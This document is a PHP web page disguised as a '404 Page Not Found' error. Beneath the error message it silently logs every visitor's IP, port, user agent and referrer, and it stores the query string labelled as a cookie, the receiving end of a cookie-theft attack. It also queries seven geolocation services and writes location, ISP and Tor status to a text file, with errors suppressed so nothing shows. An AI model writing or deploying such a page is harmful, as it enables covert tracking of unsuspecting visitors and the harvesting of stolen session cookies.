<!DOCTYPE html>
<html>
<head>
	<title>Error 404 | Redirecting to correct url</title>
	<link rel="icon" type="images/x-icon" href="../images/favicon.ico">
</head>
<body>
<?php
error_reporting(0) // REMOVE ERRORS
?>

<?php
function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 
function logData() 
{ 
	$ipLog = "information.txt"; 

	$cookie = $_SERVER['QUERY_STRING']; 

	$register_globals = (bool) ini_get('register_gobals'); 

	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 
	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	if (isset( $_SERVER['METHOD'])){
		$rqst_method = $_SERVER['METHOD'];
	}
	else{
		$rqst_method = "null";
	}
	if (isset( $_SERVER['REMOTE_HOST'])) {
		$rem_host = $_SERVER['REMOTE_HOST'];
	}
	else{
		$rem_host = "null";
	}
	if (isset($_SERVER['HTTP_REFERER'])) {
		$referer = $_SERVER['HTTP_REFERER'];
	}
	else
	{
		$referer = "null";
	}
	$date=date ("Y/m/d G:i:s"); 
	$log=fopen("$ipLog", "a+"); 


	// URL IPLOGGER JSON APIS
	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
	$ip_details1 = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
	$ip_details2 = json_decode(file_get_contents("http://free.ipwhois.io/json/{$ip}"));
	$ip_details3 = json_decode(file_get_contents("https://freegeoip.app/json/{$ip}"));
	$ip_details4 = json_decode(file_get_contents("https://ip-api.io/json/{$ip}"));
	$ip_details5 = json_decode(file_get_contents("https://ipapi.co/{$ip}/json"));
	$ip_details6 = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}"));
	
// INFORMATION
	fwrite($log, "=================================================================\n");
	fwrite($log, "Bogon:" . $ip_details->bogon . PHP_EOL);
	fwrite($log, "Status:" . $ip_details1->status . PHP_EOL);
	fwrite($log, "IP:" . $ip . PHP_EOL);
	fwrite($log, "IP Type:" . $ip_details2->type . PHP_EOL);
	fwrite($log, "IP Delay:" . $ip_details6->geoplugin_delay . PHP_EOL);
	fwrite($log, "IP Status:" . $ip_details6->geoplugin_status . PHP_EOL);
	fwrite($log, "PORT:" . $rem_port . PHP_EOL);
	fwrite($log, "HOST:" . $rem_host . PHP_EOL);
	fwrite($log, "UserAgent:" . $user_agent . PHP_EOL);
	fwrite($log, "METHOD:" . $rqst_method . PHP_EOL);
	fwrite($log, "REF:" . $referer . PHP_EOL);
	fwrite($log, "COOKIE:" . $cookie . PHP_EOL . PHP_EOL);
	fwrite($log, "DATE=" . $date . PHP_EOL);
	fwrite($log, "========================\n");
	fwrite($log, "Continent:" . $ip_details1->continent . PHP_EOL);
	fwrite($log, "Continent Code:" . $ip_details1->continentCode . PHP_EOL);
	fwrite($log, "EU:" . $ip_details4->is_in_european_union . PHP_EOL);	
	fwrite($log, "Country:" . $ip_details1->country . PHP_EOL);
	fwrite($log, "Country Code:" . $ip_details1->countryCode . PHP_EOL);
	fwrite($log, "Country Flag:" . $ip_details2->country_flag . PHP_EOL);
	fwrite($log, "Country Capital:" . $ip_details2->country_capital . PHP_EOL);
	fwrite($log, "Country Phone:" . $ip_details2->country_phone . PHP_EOL);
	fwrite($log, "Country Neighbours:" . $ip_details2->country_neighbours . PHP_EOL);
	fwrite($log, "Country Area:" . $ip_details5->country_area . PHP_EOL);
	fwrite($log, "Country Population:" . $ip_details5->country_population . PHP_EOL);
	fwrite($log, "Region Code:" . $ip_details1->region . PHP_EOL);
	fwrite($log, "Region Name:" . $ip_details->region . PHP_EOL);
	fwrite($log, "City:" . $ip_details->city . PHP_EOL);
	fwrite($log, "Languages:" . $ip_details5->languages . PHP_EOL);
	fwrite($log, "Metro Code:" . $ip_details3->metro_code . PHP_EOL);
	fwrite($log, "Location:" . $ip_details->loc . PHP_EOL);
	fwrite($log, "Latitude:" . $ip_details1->lat . PHP_EOL);
	fwrite($log, "Longitude:" . $ip_details1->lon . PHP_EOL);	
	fwrite($log, "Radius:" . $ip_details6->geoplugin_locationAccuracyRadius . PHP_EOL);	
	fwrite($log, "TimeZone:" . $ip_details->timezone . PHP_EOL);	
	fwrite($log, "timezone_dstOffset:" . $ip_details2->timezone_dstOffset . PHP_EOL);
	fwrite($log, "timezone_gmtOffset:" . $ip_details2->timezone_gmtOffset . PHP_EOL);
	fwrite($log, "timezone_gmt:" . $ip_details2->timezone_gmt . PHP_EOL);
	fwrite($log, "========================\n");
	fwrite($log, "ISP:" . $ip_details1->isp . PHP_EOL);
	fwrite($log, "ORG (1):" . $ip_details->org . PHP_EOL);
	fwrite($log, "ORG (2):" . $ip_details1->org . PHP_EOL);
	fwrite($log, "ZIP:" . $ip_details1->zip . PHP_EOL);
	fwrite($log, "AS:" . $ip_details1->as . PHP_EOL);
	fwrite($log, "District:" . $ip_details1->district . PHP_EOL);
	fwrite($log, "Currency:" . $ip_details1->currency . PHP_EOL);
	fwrite($log, "Currency Code:" . $ip_details2->currency_code . PHP_EOL);
	fwrite($log, "Currency Rates:" . $ip_details2->currency_rates . PHP_EOL);
	fwrite($log, "currency_plural:" . $ip_details2->currency_plural . PHP_EOL);
	fwrite($log, "Asname:" . $ip_details1->asname . PHP_EOL);	
	fwrite($log, "Postal:" . $ip_details->postal . PHP_EOL);	
	fwrite($log, "========================\n");
	fwrite($log, "Proxy IP:" . $ip_details1->proxy . PHP_EOL);	
	fwrite($log, "Mobile IP:" . $ip_details1->mobile . PHP_EOL);
	fwrite($log, "Hosting IP:" . $ip_details1->mobile . PHP_EOL);
	fwrite($log, "isTor:" . $ip_details4->isTorNode . PHP_EOL);
	fwrite($log, "isSpam:" . $ip_details4->isSpam . PHP_EOL);
	fwrite($log, "isSuspicious:" . $ip_details4->isSuspicious . PHP_EOL);
	fwrite($log, "========================\n");

} 
logData();
?>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <h1>Page Not Found</h1>
    <p>Sorry, but the page you were trying to view does not exist.</p>
</body>
</html>
</body>
</html> 